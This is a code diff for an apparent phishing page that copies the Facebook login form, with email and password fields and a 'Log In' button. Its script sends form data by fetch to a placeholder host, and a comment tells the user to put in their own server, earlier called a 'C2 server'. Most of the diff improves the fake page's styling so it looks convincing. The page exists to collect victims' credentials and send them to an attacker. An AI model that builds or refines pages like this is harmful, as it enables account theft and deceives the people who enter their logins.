@@ -19,6 +19,7 @@
             margin-left: auto;
             margin-right: auto;
             width: 300px;
+            height: 250px;
             margin: auto;
             border: 1px solid #ccc;
             border-radius: 10px;
@@ -33,13 +34,22 @@
         body {
             font-family: 'Roboto', sans-serif;
         }
+        button {
+            width: 300px;
+            height: 50px;
+            font-size: 20px;
+            background-color: #166fe5;
+            border-radius: 10px;
+            color: white;
+        }
     </style>
-    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse4.mm.bing.net%2Fth%2Fid%2FOIP.KCzWnbfabdUUli4v25y-_AHaEK%3Fpid%3DApi&f=1&ipt=531fd84db39aa8d6dc36c9cddd7fa19f9ad63bd747d5f80a4974e1a39505f596&ipo=images" class="image">
+    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse4.mm.bing.net%2Fth%2Fid%2FOIP.KCzWnbfabdUUli4v25y-_AHaEK%3Fpid%3DApi&f=1&ipt=531fd84db39aa8d6dc36c9cddd7fa19f9ad63bd747d5f80a4974e1a39505f596&ipo=images" class="image" width="200">
     <div class="Items">
     <p>Log Into Facebook</p>
     <form method="post" action="submit()" id="loginForm">
         <input type="email" placeholder="Email Or Phone Number"><br><br>
-        <input type="password" placeholder="Password">
+        <input type="password" placeholder="Password"><br><br>
+        <button type="submit">Log In</button>
     </form><br>
     <a href="">Forgot account? · Sign up for Facebook</a>
     </div>
@@ -57,7 +67,7 @@
 
             document.getElementById("error").innerHTML = "";
 
-            fetch('example.com', { //IMPORTANT!!! Add your C2 server/ server! DO NOT USE EXAMPLE.COM
+            fetch('example.com', { //IMPORTANT!!! Add your server! DO NOT USE EXAMPLE.COM
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
